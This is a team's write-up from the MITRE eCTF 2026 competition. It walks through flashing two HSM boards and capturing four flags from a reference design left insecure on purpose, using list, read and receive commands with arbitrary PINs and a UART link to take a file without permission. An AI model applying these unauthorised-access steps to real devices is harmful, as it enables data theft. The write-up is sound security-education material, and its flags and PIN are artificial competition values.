# eCTF 2026 — Attack the Reference Design
**Competition Writeup | CSUF Team | Design Phase Flag**

---

## Overview

This writeup documents the process of capturing four flags by attacking a deployment of the MITRE eCTF 2026 Reference Design. The reference design implements no security measures, making it vulnerable to a range of attacks. The attack package provided by the organizers was used to provision two Hardware Security Module (HSM) boards and interact with them using the eCTF host tools.

**Flags captured:**
- `ectf{boot_e2218e27c4d4255d}` — Boot Reference Flag
- `ectf{update_8193461bae8c46d1}` — Read Update Flag
- `ectf{design_f1ba8321b19521e6}` — Read Design Flag
- `ectf{steal_6dc6921061cf5b43}` — Steal Design Flag

---

## Environment

- **OS:** Linux Mint
- **Hardware:** Two MSP-LITO-L2228 attack boards (green sticker, secure bootloader), two XDS110 debuggers
- **Tools:** eCTF host tools via `uvx`

---

## Step 1 — Obtaining and Decrypting the Attack Package

The encrypted attack package was downloaded from the competition portal. The decryption key and command were provided by the organizers via Zulip.

```bash
openssl enc -d -aes-256-cbc -pbkdf2 -salt -k 010203040506070809000a0b0c0d0e0f -in mitre.enc -out mitre.zip
```

After decryption, the attack package contained:
- `attacker.prot` — encrypted firmware image for the attacker HSM
- `engineer.prot` — encrypted firmware image for the engineer HSM
- `scenario_info.yaml` — scenario configuration including group IDs and attacker PIN

Inspecting `scenario_info.yaml` revealed the attacker PIN and group permissions:

```yaml
group_ids:
  calibration: 321b
  telemetry: '6209'
  update: a4b5
hsms:
  attacker:
    permissions: a4b5=--C:6209=R-C:321b=RWC
    pin: '405984'
```

---

## Step 2 — Flashing the Attack Boards

Two attack boards were connected to the host computer via their respective XDS110 debuggers. Each board was put into bootloader mode by holding the PB21 button and tapping NRST, confirmed by the LED blinking red.

Serial ports were identified by running `ls /dev/tty*` with and without each board plugged in. With both boards connected:

- **Attacker board:** `/dev/ttyACM2`, `/dev/ttyACM3`
- **Engineer board:** `/dev/ttyACM0`, `/dev/ttyACM1`

Each board was erased, flashed with its respective firmware, and started:

```bash
uvx ectf hw /dev/ttyACM2 erase
uvx ectf hw /dev/ttyACM2 flash attacker.prot
uvx ectf hw /dev/ttyACM2 start

uvx ectf hw /dev/ttyACM0 erase
uvx ectf hw /dev/ttyACM0 flash engineer.prot
uvx ectf hw /dev/ttyACM0 start
```

Successful flashing was confirmed by the LED changing from blinking red to solid.

![Flashed attacker board](https://github.com/user-attachments/assets/219976f1-d629-459b-b209-d54a216b73c6)

![Flashed engineer board](https://github.com/user-attachments/assets/6a2d1c40-76b2-4ec5-ad18-a689ac04e81d)

---

## Step 3 — Boot Reference Flag and Read Flags

With the attacker board running, the list command was issued using the attacker PIN. Because the reference design implements no authentication, the PIN is accepted without any validation.

```bash
uvx ectf tools /dev/ttyACM2 list 405984
```

The list command succeeded and the boot reference flag was returned in the debug output.

> **Boot Reference Flag:** `ectf{boot_e2218e27c4d4255d}`

![List successful](https://github.com/user-attachments/assets/18f54a54-2bac-41d3-a7a6-5fe64e24b556)

A read command was then issued to retrieve the contents of slot 0, which belonged to the update group:

```bash
uvx ectf tools /dev/ttyACM2 read -f 405984 0 out
```

The file was successfully read and written to the output directory. The flag was embedded in the file contents.

> **Read Update Flag:** `ectf{update_8193461bae8c46d1}`

![Read file](https://github.com/user-attachments/assets/8d1471d0-51da-4347-bbf0-7176a2744581)

![Read update flag](https://github.com/user-attachments/assets/231a892f-4ff1-4012-9138-cc29737b2f46)

The same approach was used against the engineer board. Because the reference design implements no PIN validation, any PIN is accepted:

```bash
uvx ectf tools /dev/ttyACM0 list 123456
uvx ectf tools /dev/ttyACM0 read -f 405984 0 out
```

> **Read Design Flag:** `ectf{design_f1ba8321b19521e6}`

![Engineer board list successful](https://github.com/user-attachments/assets/4b8d3639-1171-40cb-bf34-d4b5c25067d6)

![Read design flag](https://github.com/user-attachments/assets/5e16ea1f-5fea-4015-8069-ff6c6a4994cf)

---

## Step 4 — Steal Design Flag

The steal design flag requires receiving a file from the engineer HSM onto the attacker HSM — a transfer the attacker should not have permission to perform. The two boards were wired together over UART1 (PA8 TX → PA9 RX and PA9 RX → PA8 TX, with a shared GND) to enable board-to-board communication.

In one terminal, the engineer board was put into listen mode:

```bash
uvx ectf tools /dev/ttyACM0 listen
```

In a second terminal, the attacker board was used to receive the file from slot 0 on the engineer board into slot 1:

```bash
uvx ectf tools /dev/ttyACM2 receive 405984 0 1
```

The receive was successful. To obtain the flag, the bootloader digest of the received file was queried while the attacker board was in bootloader mode:

```bash
uvx ectf hw /dev/ttyACM2 digest 1
```

The resulting digest was submitted to the eCTF API:

```bash
uvx ectf api steal mitre {digest}
```

> **Steal Design Flag:** `ectf{steal_6dc6921061cf5b43}`

![Successful receive](https://github.com/user-attachments/assets/11f36ac5-323d-4f5f-977f-6081a8f4b38e)

![API digest](https://github.com/user-attachments/assets/d47fe1d2-3b2f-4deb-8991-05efefddd3e4)

![Steal flag](https://github.com/user-attachments/assets/4d2cfd49-c4f2-4f1c-a80c-53b142da37c8)

---

## Root Cause Analysis

All flags were captured due to a complete absence of security controls in the reference design:

- **No PIN validation** — any PIN is accepted for any operation on any HSM.
- **No permission enforcement** — the attacker HSM was able to receive files from the engineer HSM despite lacking receive permissions for those groups.
- **No file access controls** — file contents are returned in plaintext to any caller.

These vulnerabilities are intentional in the reference design, which serves as a baseline for teams to build secure implementations upon.
